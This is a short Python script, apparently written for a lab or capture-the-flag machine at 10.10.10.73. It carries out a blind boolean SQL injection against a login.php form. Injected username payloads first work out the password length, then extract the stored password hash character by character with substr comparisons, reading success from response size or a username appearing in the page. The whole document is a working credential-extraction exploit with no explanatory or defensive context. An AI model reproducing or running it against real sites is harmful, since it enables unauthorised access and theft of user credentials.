#!/usr/bin/env python3

from urllib import request

url = "http://10.10.10.73/login.php"
headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
proxy = {"http://127.0.0.1:8080":"http"}

def getPasswLength():
    count = 0 
    while True:
        data = f"username=asd'+OR+length(password)%3d{count}+--+-&password=".encode()
        req = request.Request(url, data=data, headers=headers)
        resp = request.urlopen(req).read().decode()
        if len(resp) != 7074:
            print("Got password length!: %d" %count)
            return count
        count += 1

printable = '0123456789abcdefghijklmnopqrstuvwxyz'
passw = []

for count in range(1,34):
    for c in printable:
        data = f"username=as'+OR+(select+substr(password,{count},1)+as+ExtractString)%3d'{c}'-- -&password=".encode()
        req = request.Request(url, data=data, headers=headers)
        resp = request.urlopen(req).read().decode()
        if "chris" in resp:
            passw.append(c)
            print("Password: {}".format(''.join(passw)))
            break
        elif len(passw) == 32:
            print("")
            print("Full password retrieved: %s" %(''.join(passw)))

